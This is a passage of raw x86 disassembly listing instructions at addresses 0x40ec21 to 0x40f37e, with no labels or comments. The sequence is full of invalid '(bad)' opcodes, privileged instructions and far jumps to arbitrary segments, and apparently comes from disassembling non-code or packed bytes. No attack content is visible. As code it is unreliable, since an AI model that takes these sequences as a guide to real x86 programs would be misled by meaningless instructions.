  40ec21:	jbe    0x40ec9a
  40ec23:	enter  0x3073,0x85
  40ec27:	(bad)  
  40ec28:	in     eax,0x68
  40ec2a:	cmp    DWORD PTR [edx],ebp
  40ec2c:	xor    bh,0x56
  40ec2f:	and    DWORD PTR [ecx],0xfffffff1
  40ec32:	mov    dh,0x64
  40ec34:	enter  0x11af,0xd4
  40ec38:	xchg   edi,eax
  40ec39:	and    eax,0xf5681802
  40ec3e:	scas   al,BYTE PTR es:[edi]
  40ec3f:	cli    
  40ec40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec41:	into   
  40ec42:	int    0x6f
  40ec44:	outs   dx,DWORD PTR ds:[esi]
  40ec45:	xor    bh,BYTE PTR [ecx*8-0x40cd1d9f]
  40ec4c:	push   esi
  40ec4d:	mov    esp,0x81de41da
  40ec52:	hlt    
  40ec53:	and    eax,0x2a5a0ced
  40ec58:	jmp    0x2a8a0c82
  40ec5d:	or     al,0xc0
  40ec5f:	into   
  40ec60:	cmp    al,0x9f
  40ec62:	sar    ah,1
  40ec64:	pop    ebp
  40ec65:	(bad)  
  40ec66:	repnz adc BYTE PTR [ecx-0x1a34a934],0x3c
  40ec6e:	fwait
  40ec6f:	pop    eax
  40ec70:	push   edx
  40ec71:	cwde   
  40ec72:	jmp    0x28d0b89
  40ec77:	push   ecx
  40ec78:	clc    
  40ec79:	add    al,0x7b
  40ec7b:	cmp    BYTE PTR [edi-0x23],al
  40ec7e:	cld    
  40ec7f:	and    al,0xaa
  40ec81:	cs (bad) 
  40ec83:	int3   
  40ec84:	push   ds
  40ec85:	lahf   
  40ec86:	mov    dl,0xa8
  40ec88:	aas    
  40ec89:	fisub  DWORD PTR [esi-0x55]
  40ec8c:	or     BYTE PTR [ebx-0x26],cl
  40ec8f:	aas    
  40ec90:	jecxz  0x40ec92
  40ec92:	lock ja 0x40ec1b
  40ec95:	cmc    
  40ec96:	mov    bh,0x90
  40ec98:	xor    bl,BYTE PTR [ecx]
  40ec9a:	and    DWORD PTR [edi],edx
  40ec9c:	sbb    BYTE PTR [edx-0xf6caf42],dh
  40eca2:	inc    BYTE PTR [eax-0x2f]
  40eca5:	mov    bh,0xd7
  40eca7:	lahf   
  40eca8:	dec    esp
  40eca9:	or     al,0x69
  40ecab:	pop    esp
  40ecac:	cmp    eax,0xe9b5ccf6
  40ecb1:	in     eax,dx
  40ecb2:	mov    eax,ds:0xa3ab1cfc
  40ecb7:	ja     0x40ecdd
  40ecb9:	stos   BYTE PTR es:[edi],al
  40ecba:	pop    edx
  40ecbb:	fsincos 
  40ecbd:	scas   eax,DWORD PTR es:[edi]
  40ecbe:	sbb    esp,DWORD PTR cs:[eax-0x4a723116]
  40ecc5:	xchg   ebx,eax
  40ecc6:	test   al,0xd0
  40ecc8:	int3   
  40ecc9:	es div esp
  40eccc:	sbb    al,0xec
  40ecce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eccf:	sti    
  40ecd0:	sbb    eax,0x1a6a6329
  40ecd5:	or     al,0x98
  40ecd7:	loope  0x40ecd3
  40ecd9:	inc    edi
  40ecda:	adc    eax,DWORD PTR [edi+0x28]
  40ecdd:	les    edx,FWORD PTR [edi]
  40ecdf:	push   ss
  40ece0:	mov    al,0xf8
  40ece2:	push   es
  40ece3:	nop
  40ece4:	prefetch BYTE PTR [eax]
  40ece7:	sar    DWORD PTR ss:[ebp+0x1273bd72],0xcd
  40ecef:	dec    edi
  40ecf0:	pop    ds
  40ecf1:	inc    esi
  40ecf2:	pop    ds
  40ecf3:	retf   0xba48
  40ecf6:	dec    esi
  40ecf7:	in     al,0x9a
  40ecf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecfa:	(bad)  
  40ecfb:	ss xchg edi,eax
  40ecfd:	adc    eax,0xdcddc85c
  40ed02:	mov    eax,0x34e5a55
  40ed07:	int    0xe4
  40ed09:	fcom   DWORD PTR [esi+0x4cd543b0]
  40ed0f:	pop    edi
  40ed10:	jno    0x40ecb2
  40ed12:	mov    ds,WORD PTR [ebx-0x192ddc2e]
  40ed18:	xchg   BYTE PTR [ebp-0x58],bh
  40ed1b:	ins    BYTE PTR es:[edi],dx
  40ed1c:	mov    ah,0x56
  40ed1e:	mov    al,ds:0xc4c195e2
  40ed23:	fwait
  40ed24:	jno    0x40ecde
  40ed26:	dec    BYTE PTR [ecx]
  40ed28:	imul   edi,DWORD PTR [eax+0x641d5221],0xf6de9fcf
  40ed32:	popa   
  40ed33:	sub    eax,0xfc61e6a5
  40ed38:	add    DWORD PTR [edi+0x22370ed0],esi
  40ed3e:	outs   dx,DWORD PTR ds:[esi]
  40ed3f:	and    DWORD PTR ss:[edi+0x62],esp
  40ed43:	out    0xa2,eax
  40ed45:	cmp    eax,DWORD PTR [ebp-0x40e0de27]
  40ed4b:	dec    edx
  40ed4c:	pop    eax
  40ed4d:	test   al,0xdb
  40ed4f:	adc    al,0x78
  40ed51:	in     al,dx
  40ed52:	fdiv   QWORD PTR [esi+0x256a3d44]
  40ed58:	or     al,BYTE PTR [edx-0x71276e9f]
  40ed5e:	js     0x40ed61
  40ed60:	pop    es
  40ed61:	jo     0x40ecfd
  40ed63:	imul   esi,edi,0xc7a72ea7
  40ed69:	mul    DWORD PTR [edx]
  40ed6b:	inc    esi
  40ed6c:	clc    
  40ed6d:	cmp    edx,DWORD PTR [esi-0x196a4fd]
  40ed73:	jl     0x40ed43
  40ed75:	push   eax
  40ed76:	imul   esp,DWORD PTR [eax],0xffffffff
  40ed79:	adc    al,0xa9
  40ed7b:	sub    al,0xcb
  40ed7d:	mov    dl,BYTE PTR [ebp+0x5b]
  40ed80:	push   0x3b
  40ed82:	mov    ?,WORD PTR [eax-0x77]
  40ed85:	shl    BYTE PTR cs:[edx+eiz*4-0xa],1
  40ed8a:	pop    edx
  40ed8b:	imul   ebx,DWORD PTR [esi-0x28],0xba3af727
  40ed92:	jmp    0x6ecf:0x6704b51d
  40ed99:	sub    BYTE PTR [esp+esi*1-0x45],bl
  40ed9d:	cld    
  40ed9e:	or     DWORD PTR [esi+0x5032acd7],esi
  40eda4:	inc    esi
  40eda5:	cwde   
  40eda6:	sti    
  40eda7:	mov    ds,eax
  40eda9:	lods   eax,DWORD PTR ds:[esi]
  40edaa:	iret   
  40edab:	xchg   esi,eax
  40edac:	mov    dh,cl
  40edae:	add    eax,0xc2698704
  40edb3:	fild   DWORD PTR [ebx]
  40edb5:	or     ebx,DWORD PTR [ecx+0x3e]
  40edb8:	adc    ch,cl
  40edba:	jns    0x40ee04
  40edbc:	xchg   esi,eax
  40edbd:	or     ah,BYTE PTR [ebx+eiz*2]
  40edc0:	push   ebp
  40edc1:	(bad)  
  40edc2:	mov    eax,0x3d15fd88
  40edc7:	iret   
  40edc8:	mov    ebx,0xf3206979
  40edcd:	mul    BYTE PTR [eax+eax*8]
  40edd0:	cmp    al,BYTE PTR ds:0x29c5bce2
  40edd6:	cwde   
  40edd7:	mov    ebx,DWORD PTR [edx-0x1d]
  40edda:	repz pop ds
  40eddc:	push   edx
  40eddd:	mov    edx,0xbf98c6ee
  40ede2:	imul   ebp,DWORD PTR [eax+0x6156d662],0xc08e352
  40edec:	mov    bl,0xce
  40edee:	ds mov dh,0xbb
  40edf1:	in     eax,dx
  40edf2:	jmp    0x18898d1e
  40edf7:	nop
  40edf8:	push   ds
  40edf9:	sbb    ebx,DWORD PTR [ebx+0x42]
  40edfc:	int3   
  40edfd:	out    dx,al
  40edfe:	mov    dl,BYTE PTR [ebx]
  40ee00:	add    eax,0xfacfaa05
  40ee05:	dec    esp
  40ee06:	push   ss
  40ee07:	test   ecx,edi
  40ee09:	add    al,dh
  40ee0b:	pop    ss
  40ee0c:	xchg   esp,eax
  40ee0d:	shr    BYTE PTR ss:[edi+0x29eb826e],0x70
  40ee15:	xchg   esp,eax
  40ee16:	adc    al,0x80
  40ee18:	icebp  
  40ee19:	or     dh,BYTE PTR [ebp+0x1c616356]
  40ee1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee20:	leave  
  40ee21:	push   ss
  40ee22:	jae    0x40ee07
  40ee24:	add    eax,0x8c77d9d5
  40ee29:	xor    al,0x83
  40ee2b:	push   esi
  40ee2c:	je     0x40ee01
  40ee2e:	pop    esp
  40ee2f:	sbb    ch,BYTE PTR [ebx]
  40ee31:	aas    
  40ee32:	shl    BYTE PTR [ebp+0x15],0x19
  40ee36:	inc    esi
  40ee37:	and    eax,0x240dbf3b
  40ee3c:	cs inc ecx
  40ee3e:	fmul   QWORD PTR [eax+0x5c107384]
  40ee44:	jle    0x40ee51
  40ee46:	mov    edx,0x29179967
  40ee4b:	push   ds
  40ee4c:	pop    ebp
  40ee4d:	dec    edx
  40ee4e:	pop    esp
  40ee4f:	sbb    ebp,DWORD PTR [eax+0xb4ba2ce]
  40ee55:	inc    ebx
  40ee56:	sti    
  40ee57:	dec    ebp
  40ee58:	ret    
  40ee59:	and    al,0xb5
  40ee5b:	loop   0x40ee6f
  40ee5d:	mov    dh,BYTE PTR [eax+esi*4]
  40ee60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee61:	xchg   ebx,eax
  40ee62:	shl    BYTE PTR [ebx-0x62],1
  40ee65:	mov    dl,0xe
  40ee67:	xchg   edi,eax
  40ee68:	inc    eax
  40ee69:	jnp    0x40ee10
  40ee6b:	xchg   DWORD PTR [edx-0x2f61f5fa],ecx
  40ee71:	push   edi
  40ee72:	sbb    edi,DWORD PTR [eax]
  40ee74:	popf   
  40ee75:	addr16 pop esi
  40ee77:	lahf   
  40ee78:	xor    al,dl
  40ee7a:	jno    0x40ee81
  40ee7c:	das    
  40ee7d:	dec    esp
  40ee7e:	sub    edx,DWORD PTR [edi+0x2d]
  40ee81:	repz mov WORD PTR [ecx+0x1afd6bd4],es
  40ee88:	push   0x1d
  40ee8a:	add    al,0x81
  40ee8c:	cs mov bl,0xb4
  40ee8f:	jo     0x40ee7d
  40ee91:	cmp    dh,BYTE PTR [edx+0x673acbd8]
  40ee97:	inc    eax
  40ee98:	or     edi,eax
  40ee9a:	or     ah,bl
  40ee9c:	push   edx
  40ee9d:	mov    ebp,0xb0e9270
  40eea2:	test   DWORD PTR [ebx],ebx
  40eea4:	inc    esp
  40eea5:	pop    esi
  40eea6:	enter  0x7fb4,0xe5
  40eeaa:	jge    0x40ee50
  40eeac:	cld    
  40eead:	push   ebx
  40eeae:	jmp    0x40ef0c
  40eeb0:	cmp    DWORD PTR [esi+0x15],ebp
  40eeb3:	jbe    0x40eec6
  40eeb5:	das    
  40eeb6:	xor    al,0xf1
  40eeb8:	pop    ebp
  40eeb9:	scas   eax,DWORD PTR es:[edi]
  40eeba:	adc    eax,0x3533f7
  40eebf:	push   dx
  40eec1:	dec    esi
  40eec2:	(bad)  
  40eec3:	retf   0x5c3c
  40eec6:	(bad)  
  40eec7:	push   edx
  40eec8:	popf   
  40eec9:	popa   
  40eeca:	xchg   eax,edi
  40eecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eecd:	jecxz  0x40eeda
  40eecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eed0:	mov    ecx,0xfece1b98
  40eed5:	in     al,dx
  40eed6:	adc    ebx,DWORD PTR ds:0x29ac0ccb
  40eedc:	hlt    
  40eedd:	xchg   ebp,eax
  40eede:	fistp  QWORD PTR [eax-0x4b]
  40eee1:	mov    edx,0x601dca84
  40eee6:	mov    BYTE PTR [ebx],dh
  40eee8:	mov    ah,0x38
  40eeea:	mov    ch,0x97
  40eeec:	jns    0x40ef1b
  40eeee:	xlat   BYTE PTR ds:[ebx]
  40eeef:	ss into 
  40eef1:	aam    0x7a
  40eef3:	pop    eax
  40eef4:	sbb    esp,DWORD PTR [eax-0x3d98e407]
  40eefa:	rol    DWORD PTR [ebx-0xf99ab8],cl
  40ef00:	and    al,0xeb
  40ef02:	inc    edi
  40ef03:	and    ebx,DWORD PTR [ecx-0x607ed037]
  40ef09:	dec    ebp
  40ef0a:	stos   BYTE PTR es:[edi],al
  40ef0b:	sub    esi,DWORD PTR [edx+0x6c85402f]
  40ef11:	add    eax,DWORD PTR [esi]
  40ef13:	lds    ecx,FWORD PTR [ecx+0x68]
  40ef16:	fdivr  st,st(0)
  40ef18:	pushf  
  40ef19:	cmp    al,BYTE PTR [edi+edx*4+0x7b]
  40ef1d:	mov    edi,0xeda60e51
  40ef22:	and    esp,DWORD PTR ds:0xfea8c6d9
  40ef28:	es retf 
  40ef2a:	imul   ebp,edx,0xffffffa2
  40ef2d:	sub    BYTE PTR [edx],0xe3
  40ef30:	mov    esi,0xd2398fb
  40ef35:	sub    BYTE PTR [ecx+ebx*2+0x76c2dd28],ch
  40ef3c:	rcr    DWORD PTR [edi+0x7c],1
  40ef3f:	xor    BYTE PTR cs:[esp+eax*8-0x40],ch
  40ef44:	(bad)  
  40ef45:	jge    0x40ef3a
  40ef47:	add    esi,DWORD PTR [ebx+0x46d493a7]
  40ef4d:	fstp   DWORD PTR [eax-0x5]
  40ef50:	mov    ah,dl
  40ef52:	push   esi
  40ef53:	cmp    al,0x69
  40ef55:	inc    esi
  40ef56:	mov    BYTE PTR [eax],ah
  40ef58:	enter  0xe4be,0x69
  40ef5c:	(bad)  
  40ef5d:	sbb    ebp,edx
  40ef5f:	inc    edi
  40ef60:	sbb    al,0x19
  40ef62:	inc    DWORD PTR [ebp-0x32]
  40ef65:	jae    0x40ef5d
  40ef67:	(bad)
  40ef6b:	pop    ebx
  40ef6c:	mov    ebx,esi
  40ef6e:	and    cl,BYTE PTR [edi-0x66]
  40ef71:	fisubr WORD PTR [ecx-0x57594df4]
  40ef77:	xchg   edx,eax
  40ef78:	or     DWORD PTR [esi-0x75],esp
  40ef7b:	jecxz  0x40ef40
  40ef7d:	mov    esp,0xdde8e723
  40ef82:	push   ss
  40ef83:	and    dh,dh
  40ef85:	jo     0x40ef88
  40ef87:	rcpps  xmm4,XMMWORD PTR [edi]
  40ef8a:	and    esi,DWORD PTR [edx-0x38]
  40ef8d:	test   BYTE PTR [edx-0x3032aa75],bl
  40ef93:	inc    ebx
  40ef94:	and    eax,0xeefc339a
  40ef99:	fild   WORD PTR [eax-0x63eb70a7]
  40ef9f:	or     BYTE PTR [ecx+0x1f88b40b],bl
  40efa5:	dec    esi
  40efa6:	xlat   BYTE PTR ds:[ebx]
  40efa7:	popa   
  40efa8:	jp     0x40efc9
  40efaa:	mov    ebp,0x29df59b2
  40efaf:	or     al,0xa5
  40efb1:	add    BYTE PTR [eax+eiz*1-0x31228996],dl
  40efb8:	pop    es
  40efb9:	and    al,0x97
  40efbb:	ret    0x5a47
  40efbe:	sbb    DWORD PTR [esi+0x773c312f],esp
  40efc4:	mov    ch,0xb3
  40efc6:	cli    
  40efc7:	xor    al,0xc0
  40efc9:	adc    esi,ebx
  40efcb:	xchg   BYTE PTR [edx+ebp*2-0x43],cl
  40efcf:	cmc    
  40efd0:	enter  0xf597,0x83
  40efd4:	ss mov esi,0x2b136483
  40efda:	call   0xaaad:0x94e8458
  40efe1:	mov    bh,0xa7
  40efe3:	inc    edx
  40efe4:	retf   0xe4d9
  40efe7:	sbb    al,0x3f
  40efe9:	pushf  
  40efea:	data16 and BYTE PTR [ebx-0x34981881],bh
  40eff1:	or     eax,ecx
  40eff3:	scas   al,BYTE PTR es:[edi]
  40eff4:	sar    edx,1
  40eff6:	aas    
  40eff7:	je     0x40eff0
  40eff9:	jp     0x40f00e
  40effb:	aad    0xdd
  40effd:	fwait
  40effe:	mov    bh,0xa3
  40f000:	(bad)  
  40f001:	cmc    
  40f002:	jmp    0x46476ab8
  40f007:	pop    ss
  40f008:	xchg   esi,eax
  40f009:	lods   eax,DWORD PTR ds:[esi]
  40f00a:	(bad)  [ebp+0x17]
  40f00d:	fsub   QWORD PTR [ecx+0x6c5d494f]
  40f013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f014:	push   cs
  40f015:	adc    DWORD PTR [eax],ebp
  40f017:	mov    eax,ds:0x586b99fc
  40f01c:	ret    
  40f01d:	dec    ebx
  40f01e:	into   
  40f01f:	xchg   edx,eax
  40f020:	xchg   DWORD PTR ds:0xb085335c,edi
  40f026:	push   0xffffffa8
  40f028:	and    esi,DWORD PTR [ebx]
  40f02a:	imul   esi,DWORD PTR [eax+ecx*4],0x7bcb1890
  40f031:	std    
  40f032:	add    cl,BYTE PTR [esi+edi*4]
  40f035:	pop    es
  40f036:	sub    ch,dl
  40f038:	gs push eax
  40f03a:	into   
  40f03b:	out    0xcf,eax
  40f03d:	test   al,0x3d
  40f03f:	std    
  40f040:	mov    dl,0xab
  40f042:	push   esi
  40f043:	bound  edi,QWORD PTR [esi+0x7e]
  40f046:	ror    BYTE PTR [ecx+0x17612158],cl
  40f04c:	test   BYTE PTR [ebp+0x64],cl
  40f04f:	(bad)  
  40f050:	in     eax,0x1
  40f052:	inc    ebp
  40f053:	pop    ds
  40f054:	ret    0x695f
  40f057:	rcl    DWORD PTR [edx+eax*2+0x15f887e],0x31
  40f05f:	fs mov dh,0xa7
  40f062:	or     dh,BYTE PTR [ecx+0x66]
  40f065:	lods   eax,DWORD PTR ds:[esi]
  40f066:	nop
  40f067:	mov    eax,0x54cc67a8
  40f06c:	pop    ebp
  40f06d:	call   0xf256:0xe392141d
  40f074:	aas    
  40f075:	mov    esp,0x440ff22
  40f07a:	rol    BYTE PTR [edi-0x123356f],1
  40f080:	sbb    al,0x6b
  40f082:	push   esp
  40f083:	xchg   edi,eax
  40f084:	mov    ds:0x29d7fcd9,eax
  40f089:	fnstsw WORD PTR [esi+0x43]
  40f08c:	push   esi
  40f08d:	add    esi,DWORD PTR [edx+0x38]
  40f090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f091:	sbb    DWORD PTR [ebx+0x72303230],ecx
  40f097:	add    bl,BYTE PTR [ebx+0x70876573]
  40f09d:	in     al,0x52
  40f09f:	aad    0x6d
  40f0a1:	dec    esi
  40f0a2:	std    
  40f0a3:	xchg   esi,eax
  40f0a4:	mov    al,0xa2
  40f0a6:	ss fmul st,st(7)
  40f0a9:	rcl    DWORD PTR [ebx+esi*8+0xf],1
  40f0ad:	rcl    BYTE PTR [ebx-0x415430f4],0xc6
  40f0b4:	pop    eax
  40f0b5:	adc    BYTE PTR [edi],bl
  40f0b7:	adc    al,0xb9
  40f0b9:	xchg   esi,eax
  40f0ba:	xchg   DWORD PTR [ebx],esp
  40f0bc:	sbb    dl,bh
  40f0be:	mov    edx,0x5b4f45cf
  40f0c3:	jae    0x40f0d7
  40f0c5:	in     eax,dx
  40f0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0c7:	mov    ds:0x10c90d3c,eax
  40f0cc:	and    edx,DWORD PTR [esi+0x7b]
  40f0cf:	fwait
  40f0d0:	hlt    
  40f0d1:	(bad)  
  40f0d2:	in     eax,dx
  40f0d3:	and    DWORD PTR [eax],edx
  40f0d5:	or     bh,dl
  40f0d7:	les    ebp,FWORD PTR [esi+edx*1]
  40f0da:	and    dl,BYTE PTR [ebp+0x3d]
  40f0dd:	mov    bl,0xd2
  40f0df:	retf   0x2003
  40f0e2:	mov    ah,0x89
  40f0e4:	clc    
  40f0e5:	push   edi
  40f0e6:	fs mov al,0xdb
  40f0e9:	pop    eax
  40f0ea:	aaa    
  40f0eb:	fsubrp st(2),st
  40f0ed:	push   0x5b
  40f0ef:	jmp    0x40f0e9
  40f0f1:	(bad)  
  40f0f2:	in     al,0x94
  40f0f4:	dec    esp
  40f0f5:	call   0x50c52367
  40f0fa:	mov    dh,BYTE PTR [edi]
  40f0fc:	leave  
  40f0fd:	xchg   esp,eax
  40f0fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ff:	jnp    0x40f0f3
  40f101:	xor    cl,BYTE PTR [eax+0x54477961]
  40f107:	pop    esp
  40f108:	and    eax,0x17f95c84
  40f10d:	mov    bh,0x5e
  40f10f:	mov    ds:0x469fae18,eax
  40f114:	popa   
  40f115:	adc    BYTE PTR [esi-0x23],bl
  40f118:	jp     0x40f0a2
  40f11a:	mov    cl,0x7f
  40f11c:	lds    ecx,FWORD PTR [eax-0x7aab8d48]
  40f122:	nop
  40f123:	pop    edx
  40f124:	mov    bh,0xa4
  40f126:	stos   DWORD PTR es:[edi],eax
  40f127:	xchg   ebx,eax
  40f128:	jl     0x40f17a
  40f12a:	rol    DWORD PTR [edi-0x3a],0x37
  40f12e:	xchg   ebp,eax
  40f12f:	retf   
  40f130:	sbb    bl,BYTE PTR [edx-0x3f9f419]
  40f136:	cmp    ah,dh
  40f138:	add    eax,0xea6111b0
  40f13d:	jl     0x40f1ba
  40f13f:	(bad)  
  40f140:	lods   eax,DWORD PTR ds:[esi]
  40f141:	mov    ch,0xe9
  40f143:	mov    edx,fs
  40f145:	fdiv   QWORD PTR [edx+0x41]
  40f148:	(bad)  
  40f149:	repnz xchg ecx,eax
  40f14b:	lds    esi,FWORD PTR [edx+0x5d]
  40f14e:	push   eax
  40f14f:	out    0x95,eax
  40f151:	jns    0x40f13b
  40f153:	mov    bh,0x38
  40f155:	sbb    ebp,DWORD PTR [ebp+0xb]
  40f158:	je     0x40f144
  40f15a:	push   eax
  40f15b:	leave  
  40f15c:	retf   0x61dd
  40f15f:	push   edx
  40f160:	sbb    eax,0x4e39f629
  40f165:	aam    0x66
  40f167:	jne    0x40f14f
  40f169:	mov    cl,0x7e
  40f16b:	leave  
  40f16c:	sbb    dh,cl
  40f16e:	jns    0x40f189
  40f170:	mov    DWORD PTR [eax-0x7595168b],edi
  40f176:	adc    BYTE PTR [edi+0x3e],0x86
  40f17a:	test   BYTE PTR [ebp+0x262efda8],0x32
  40f181:	ins    DWORD PTR es:[edi],dx
  40f182:	inc    esi
  40f183:	scas   eax,DWORD PTR es:[edi]
  40f184:	push   es
  40f185:	cmp    al,0xf7
  40f187:	add    DWORD PTR [edx-0x4c0d76fc],esp
  40f18d:	jmp    0x19f2fadd
  40f192:	push   0xffffffb2
  40f194:	push   edx
  40f195:	jns    0x40f1dc
  40f197:	daa    
  40f198:	fwait
  40f199:	dec    ebp
  40f19a:	dec    ebp
  40f19b:	dec    edx
  40f19c:	shl    BYTE PTR [ecx],cl
  40f19e:	mov    edi,0xc845909
  40f1a3:	mov    ebp,0xc6943cfb
  40f1a8:	das    
  40f1a9:	mov    al,ds:0xb142ab2c
  40f1ae:	pop    eax
  40f1af:	mov    ch,0x42
  40f1b1:	push   ebp
  40f1b2:	inc    esp
  40f1b3:	mov    dl,0x7c
  40f1b5:	mov    ch,0x95
  40f1b7:	push   ebp
  40f1b8:	jb     0x40f1e5
  40f1ba:	sbb    ebp,ebx
  40f1bc:	and    bl,bh
  40f1be:	add    al,0x41
  40f1c0:	cdq    
  40f1c1:	lds    ebx,FWORD PTR [edi-0x39a69627]
  40f1c7:	mov    ecx,0x3acf1a52
  40f1cc:	push   0x10
  40f1ce:	call   0x537f:0xd7077816
  40f1d5:	adc    BYTE PTR [eax],bh
  40f1d7:	push   ebp
  40f1d8:	inc    ecx
  40f1d9:	addr16 jb 0x40f188
  40f1dc:	cmp    dh,dh
  40f1de:	outs   dx,DWORD PTR ds:[esi]
  40f1df:	test   DWORD PTR [ebp+0x642bf62d],ebx
  40f1e5:	stc    
  40f1e6:	jg     0x40f18a
  40f1e8:	sub    esp,DWORD PTR [edi]
  40f1ea:	pop    ds
  40f1eb:	sbb    DWORD PTR [esp+edx*1+0x15],eax
  40f1ef:	jne    0x40f187
  40f1f1:	pop    ss
  40f1f2:	rcl    DWORD PTR [ecx+0x60],1
  40f1f5:	adc    al,0xe7
  40f1f7:	(bad)  
  40f1f8:	cmp    eax,0xa0b688c6
  40f1fd:	or     al,BYTE PTR [ecx-0x13]
  40f200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f201:	mov    ebx,0xf910625d
  40f206:	jns    0x40f1ee
  40f208:	push   cs
  40f209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f20a:	push   cs
  40f20b:	sbb    edi,DWORD PTR [ebx]
  40f20d:	cmp    al,0xe8
  40f20f:	fimul  DWORD PTR [esi]
  40f211:	lds    esi,FWORD PTR [ecx+0x7c5acae0]
  40f217:	mov    eax,0x3e45080
  40f21c:	mov    eax,ds:0x89795165
  40f221:	xlat   BYTE PTR ds:[ebx]
  40f222:	and    BYTE PTR [edx],dh
  40f224:	gs push 0xba443576
  40f22a:	sub    eax,0x2622196f
  40f22f:	add    eax,0x38ff018d
  40f234:	call   0x7db3b7d7
  40f239:	pop    es
  40f23a:	loopne 0x40f217
  40f23c:	(bad)  
  40f23d:	mov    dl,0xb7
  40f23f:	mov    ds:0x17730fc9,al
  40f244:	cld    
  40f245:	jp     0x40f1fa
  40f247:	push   0xde395786
  40f24c:	test   eax,0x43205202
  40f251:	and    bl,bh
  40f253:	test   al,0x9e
  40f255:	cmp    eax,0x22f7a61c
  40f25a:	and    al,0xec
  40f25c:	ret    
  40f25d:	sub    al,0x7e
  40f25f:	xor    DWORD PTR [edx-0x32125ae1],esp
  40f265:	cmp    cl,dh
  40f267:	addr16 sbb al,0x42
  40f26a:	sub    al,BYTE PTR [esi+0x4b]
  40f26d:	scas   eax,DWORD PTR es:[edi]
  40f26e:	int    0x3e
  40f270:	mov    al,ds:0xea7508f2
  40f275:	push   ss
  40f276:	push   ebp
  40f277:	lds    ecx,FWORD PTR [edx]
  40f279:	dec    ecx
  40f27a:	xor    cl,bl
  40f27c:	dec    ecx
  40f27d:	dec    ebp
  40f27e:	jge    0x40f2e2
  40f280:	mov    es,WORD PTR [ebx-0x68]
  40f283:	push   edx
  40f284:	or     dl,dh
  40f286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f287:	loop   0x40f289
  40f289:	cmp    ecx,DWORD PTR [edi]
  40f28b:	ins    DWORD PTR es:[edi],dx
  40f28c:	loope  0x40f2bc
  40f28e:	xchg   esi,eax
  40f28f:	ss nop eax
  40f293:	bound  ecx,QWORD PTR [edi+0x3766207f]
  40f299:	fwait
  40f29a:	and    ecx,edx
  40f29c:	sub    esp,ecx
  40f29e:	add    al,0xcb
  40f2a0:	fldcw  WORD PTR [edx-0x11a0b8e6]
  40f2a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2a8:	mov    edx,0xa3f13bfb
  40f2ad:	ja     0x40f2cc
  40f2af:	pop    eax
  40f2b0:	ins    DWORD PTR es:[edi],dx
  40f2b1:	test   DWORD PTR [eax*4-0x75191f46],esp
  40f2b8:	sar    DWORD PTR [edx-0x2c84625b],1
  40f2be:	faddp  st(5),st
  40f2c0:	jg     0x40f2e9
  40f2c2:	stc    
  40f2c3:	and    esp,edx
  40f2c5:	push   eax
  40f2c6:	inc    eax
  40f2c7:	sub    BYTE PTR [ebx],cl
  40f2c9:	test   BYTE PTR [ebp-0x79],0x3b
  40f2cd:	loop   0x40f31c
  40f2cf:	adc    DWORD PTR [ebp-0x5],ebp
  40f2d2:	enter  0x3f9d,0x45
  40f2d6:	pop    ss
  40f2d7:	jle    0x40f29f
  40f2d9:	je     0x40f26a
  40f2db:	fldenv [eax+0x72410ef1]
  40f2e1:	mov    al,BYTE PTR [ebp-0x6f290370]
  40f2e7:	dec    esi
  40f2e8:	out    dx,al
  40f2e9:	push   ecx
  40f2ea:	mov    bh,0x2a
  40f2ec:	dec    edx
  40f2ed:	sbb    ch,dh
  40f2ef:	lock rcl DWORD PTR [edi-0x2bf14a92],cl
  40f2f6:	xchg   edi,eax
  40f2f7:	xchg   BYTE PTR [esi-0x3bff4a61],ah
  40f2fd:	jmp    0x40f330
  40f2ff:	or     esi,DWORD PTR [ebx-0x61]
  40f302:	adc    DWORD PTR [esi-0x47ce0f86],ebx
  40f308:	addr16 mov ebx,eax
  40f30b:	dec    esi
  40f30c:	pop    es
  40f30d:	xor    edx,eax
  40f30f:	out    dx,al
  40f310:	jmp    0xbabb:0x2abda17a
  40f317:	adc    DWORD PTR [eax+0x5a],ebp
  40f31a:	push   0x11
  40f31c:	fdivr  DWORD PTR [eax]
  40f31e:	xchg   ebx,eax
  40f31f:	sbb    bl,al
  40f321:	(bad)  
  40f322:	lods   al,BYTE PTR ds:[esi]
  40f323:	and    eax,0x66794aee
  40f328:	sub    eax,0x9b5ab1b
  40f32d:	rcr    BYTE PTR [ecx+edx*4+0x11],cl
  40f331:	imul   BYTE PTR [ebx+0x42]
  40f334:	scas   eax,DWORD PTR es:[edi]
  40f335:	push   es
  40f336:	xchg   ebp,eax
  40f337:	(bad)  
  40f339:	pusha  
  40f33a:	fwait
  40f33b:	jnp    0x40f2c1
  40f33d:	xchg   edi,eax
  40f33e:	(bad)
  40f342:	mov    ebp,0x6d5fcfe2
  40f347:	clc    
  40f348:	ja     0x40f34c
  40f34a:	fisub  WORD PTR ds:0xb1b64430
  40f350:	xor    DWORD PTR es:[ecx-0x33],esp
  40f354:	enter  0xa5b6,0xae
  40f358:	sub    al,0xf1
  40f35a:	outs   dx,DWORD PTR ds:[esi]
  40f35b:	jle    0x40f389
  40f35d:	js     0x40f323
  40f35f:	(bad)  
  40f360:	enter  0x5d77,0xba
  40f364:	out    dx,al
  40f365:	inc    ebx
  40f366:	xor    eax,0x57884d9f
  40f36b:	(bad)  
  40f36c:	mov    eax,0xab058794
  40f371:	and    dl,BYTE PTR [ecx+edx*8-0x45]
  40f375:	ret    0xe252
  40f378:	sbb    bl,cl
  40f37a:	scas   al,BYTE PTR es:[edi]
  40f37b:	inc    edi
  40f37c:	push   0xffffffe9
  40f37e:	mov    ebx,0x41ed8dc1
